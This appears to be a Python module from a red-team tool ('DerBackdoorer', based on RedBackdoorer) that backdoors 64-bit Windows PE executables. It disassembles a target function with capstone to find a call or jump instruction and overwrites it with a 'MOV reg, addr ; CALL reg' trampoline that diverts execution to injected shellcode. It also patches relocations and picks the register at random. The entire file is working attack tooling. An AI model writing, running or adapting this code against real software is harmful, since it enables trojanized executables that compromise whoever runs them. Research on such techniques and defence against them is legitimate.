#!/usr/bin/python3
#
# Based on the original RedBackdoorer by Mariusz Banach
#

import random
import textwrap
import pefile
import capstone
import keystone
from enum import IntEnum
import logging

from utils import hexdump
from pe.superpe import SuperPe
from model.defs import *

logger = logging.getLogger("DerBackdoorer")


class FunctionBackdoorer:
    def __init__(self, superpe: SuperPe, main_shc: bytes):
        self.superpe: SuperPe = superpe
        self.shellcodeData: bytes = main_shc
        self.shellcodeAddr: int = 0

        self.pe_data = self.superpe.pe.get_memory_mapped_image()

        self.cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64 + capstone.CS_MODE_LITTLE_ENDIAN)
        self.ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64 + keystone.KS_MODE_LITTLE_ENDIAN)
        self.cs.detail = True


    def backdoor_function(self, function_addr: int, shellcode_addr: int):
        self.shellcodeAddr = shellcode_addr
        logger.info("Backdooring function at 0x{:X} (to shellcode 0x{:X})".format(function_addr, shellcode_addr))
        
        instr = self.find_suitable_instruction_addr(function_addr, 128)
        if instr is None:
            raise Exception("Couldn't find a suitable instruction to backdoor")
        compiled_trampoline, trampoline_reloc_offset = self.get_trampoline(instr)

        # write
        self.superpe.pe.set_bytes_at_rva(instr.address, bytes(compiled_trampoline))

        # relocs
        relocs = (
            instr.address + trampoline_reloc_offset,
        )
        pageRva = 4096 * int((instr.address + trampoline_reloc_offset) / 4096)
        self.superpe.addImageBaseRelocations(pageRva, relocs)


    def find_suitable_instruction_addr(self, startOffset, length, maxDepth = 5):
        """Find a instruction to backdoor. Recursively."""
        return self._find_suitable_instruction_addr(startOffset, length, maxDepth, 1)


    def _find_suitable_instruction_addr(self, startOffset, length, maxDepth, depth):
        logger.info("find_suitable_instruction_addr: off: 0x{:X} len:{} depth:{}".format(startOffset, length, depth))

        if depth > maxDepth:
            return None

        data = self.pe_data[startOffset:startOffset + length]

        for instr in self.cs.disasm(data, startOffset):
            self.printInstr(instr, depth)

            # find a call/jmp instruction with an immediate operand
            if len(instr.operands) != 1:
                continue
            operand = instr.operands[0]
            if operand.type != capstone.CS_OP_IMM:
                continue

            # We found one. check it.
            logger.info('\t' * depth + f' -> Found OP_IMM: 0x{operand.value.imm:X}')
            is_jumpy = instr.mnemonic.lower() in ['jmp', 'je', 'jz', 'jne', 'jnz', 'ja', 'jb', 'jae', 'jbe', 'jg', 'jl', 'jge', 'jle']
            is_jumpy |= instr.mnemonic.lower() == 'call'
            if not is_jumpy:
                continue

            # dont take a jump too early
            if depth >= 2:
                # use this as the backdoor
                return instr
            else:
                # follow it deeper
                if depth + 1 <= maxDepth:
                    out = self._find_suitable_instruction_addr(
                        operand.value.imm, length, maxDepth, depth + 1)
                    return out
        return None


    def get_trampoline(self, instr):
        addrOffset = -1

        if not self.superpe.is_64():
            raise Exception("Not 64 bit")
        reg = random.choice(['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi']).upper()
        full_shellcode_addr = self.shellcodeAddr + self.superpe.pe.OPTIONAL_HEADER.ImageBase 

        enc, count = self.ks.asm(f'MOV {reg}, 0x{full_shellcode_addr:X}')
        for instr2 in self.cs.disasm(bytes(enc), 0):
            addrOffset = len(instr2.bytes) - instr2.addr_size
            break

        jump = random.choice([
            f'CALL {reg}',

            #
            # During my tests I found that CALL reg works stabily all the time, whereas below two gadgets
            # are known to crash on seldom occassions.
            #

            #f'JMP {reg}',
            #f'PUSH {reg} ; RET',
        ])

        trampoline_text = f'MOV {reg}, 0x{full_shellcode_addr:X} ; {jump}'
        trampoline_compiled, count = self.ks.asm(trampoline_text)
        logger.info("--[ Backdooring {} at 0x{:X} with trampoline: {}".format(
            instr.mnemonic.upper(), instr.address, trampoline_text))
        return trampoline_compiled, addrOffset
    

    def printInstr(self, instr, depth):
        _bytes = [f'{x:02x}' for x in instr.bytes[:8]]
        if len(instr.bytes) < 8:
            _bytes.extend(['  ',] * (8 - len(instr.bytes)))

        instrBytes = ' '.join([f'{x}' for x in _bytes])
        logger.info('\t' * 1 + f'[{instr.address:08x}]\t{instrBytes}' + '\t' * depth + f'{instr.mnemonic}\t{instr.op_str}')

